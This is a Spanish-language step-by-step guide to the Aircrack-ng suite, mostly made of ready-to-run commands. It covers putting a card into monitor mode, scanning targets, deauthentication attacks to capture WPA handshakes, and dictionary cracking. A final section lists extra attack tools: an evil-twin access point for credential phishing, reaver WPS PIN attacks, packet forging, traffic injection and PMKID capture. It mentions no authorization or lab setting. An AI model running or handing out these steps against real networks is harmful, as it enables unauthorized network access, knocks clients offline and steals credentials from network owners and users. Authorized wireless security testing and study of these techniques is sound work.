Guia de Aircrack-ng Suite

Flujo cronológico completo — de modo monitor a crackeo de handshake, con herramientas complementarias.

01 — PREPARACIÓN DE LA INTERFAZ
1

Ver interfaces disponibles

Identifica el nombre de tu adaptador wifi (ej. wlan0) y confirma que soporta modo monitor.

iwconfig ip a
2

Matar procesos conflictivos

NetworkManager y wpa_supplicant interfieren con el modo monitor. Los detiene antes de continuar.

airmon-ng check airmon-ng check kill
Si necesitas internet mientras tanto, anota qué procesos mató para reiniciarlos después.
3

Activar modo monitor

Pone la tarjeta a capturar todo el tráfico del aire, no solo el dirigido a ti (como el modo managed normal).

airmon-ng start wlan0
Suele crear una interfaz nueva, típicamente wlan0mon. Verifica con iwconfig otra vez.
02 — RECONOCIMIENTO (AIRODUMP-NG)
4

Escanear redes cercanas

Muestra BSSID, canal, cifrado (WEP/WPA/WPA2/WPA3) y potencia de todas las redes al alcance.

airodump-ng wlan0mon
Anota el BSSID y el CH (canal) de tu objetivo. Ctrl+C para detener.
5

Capturar tráfico de la red objetivo

Fija el escaneo a un canal y BSSID específicos, y guarda los paquetes capturados en disco (incluido el handshake cuando ocurra).

airodump-ng -c <canal> --bssid <BSSID> -w captura wlan0mon
-c canal de la red objetivo
--bssid MAC del punto de acceso
-w prefijo de los archivos de salida (.cap, .csv, etc.)
03 — DESAUTENTICACIÓN (AIREPLAY-NG)
6

Forzar el handshake (deauth attack)

Envía paquetes de desautenticación a un cliente conectado para que se reconecte y así capturar el 4-way handshake WPA/WPA2.

aireplay-ng --deauth 10 -a <BSSID> -c <MAC_cliente> wlan0mon
--deauth 10 número de paquetes de desauth a enviar
-a BSSID del AP objetivo
-c MAC del cliente (opcional; sin esto afecta a todos)
Debes tener airodump-ng corriendo en paralelo (paso 5) para ver el momento en que aparece "WPA handshake:" arriba a la derecha.
7

Verificar el handshake capturado

Confirma que el archivo .cap contiene un handshake válido antes de intentar crackearlo.

aircrack-ng captura-01.cap
Si no hay clientes a quién desautenticar, se puede probar un ataque de asociación falsa: aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon
04 — CRACKEO (AIRCRACK-NG)
8

Crackear con diccionario

Prueba cada palabra del diccionario contra el handshake capturado hasta encontrar la contraseña.

aircrack-ng -w diccionario.txt -b <BSSID> captura-01.cap
-w ruta del diccionario (ej. rockyou.txt)
-b BSSID del objetivo, por si el .cap tiene varias redes
En WEP, el proceso es distinto: se usa aircrack-ng directo sobre suficientes IVs capturados, sin necesidad de diccionario.
05 — LIMPIEZA: VOLVER A MODO MANAGED
9

Detener el modo monitor

Devuelve la tarjeta a su interfaz y modo original.

airmon-ng stop wlan0mon
10

Restaurar la conexión normal

Reinicia los servicios que detuviste en el paso 2 para recuperar wifi/internet normal.

service NetworkManager restart # o alternativamente: systemctl restart NetworkManager
Comando manual alternativo (sin airmon-ng) para forzar modo managed: ip link set wlan0mon down && iw wlan0mon set type managed && ip link set wlan0mon up
06 — HERRAMIENTAS COMPLEMENTARIAS DEL SUITE

airdecap-ng

Desencripta capturas .cap una vez que tienes la clave, para analizar el tráfico en texto plano.

airdecap-ng -e <ESSID> -p <password> captura-01.cap

packetforge-ng

Crea paquetes ARP/UDP forjados a partir de un PRGA (útil en ataques WEP tipo chop-chop/fragmentation).

packetforge-ng --arp -a <BSSID> -h <MAC> -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w forjado.cap

airbase-ng

Crea un punto de acceso falso (rogue AP / evil twin) para ataques de phishing o captura de credenciales.

airbase-ng -e "RedFalsa" -c <canal> wlan0mon

airdecloak-ng

Elimina WEP cloaking de una captura para limpiar paquetes corruptos inyectados por sistemas IDS.

airdecloak-ng -i captura-01.cap -o limpio.cap

airtun-ng

Crea un túnel de interfaz virtual para inyectar tráfico arbitrario en una red ya comprometida.

airtun-ng -a <BSSID> -w diccionario.txt wlan0mon

wash (reaver suite)

No es parte de aircrack-ng pero se usa junto a él: detecta APs con WPS activo, vulnerables a ataques de PIN.

wash -i wlan0mon

reaver

Explota el WPS PIN para recuperar la contraseña WPA/WPA2 sin necesidad de diccionario.

reaver -i wlan0mon -b <BSSID> -vv

crunch

Genera diccionarios de fuerza bruta con patrones personalizados (longitud, charset).

crunch 8 8 0123456789 -o diccionario.txt

hcxdumptool / hcxpcapngtool

Alternativa moderna para capturar handshakes (incluye PMKID, sin necesidad de deauth) y convertirlos a formato hashcat.

hcxdumptool -i wlan0mon -o captura.pcapng hcxpcapngtool -o hash.22000 captura.pcapng
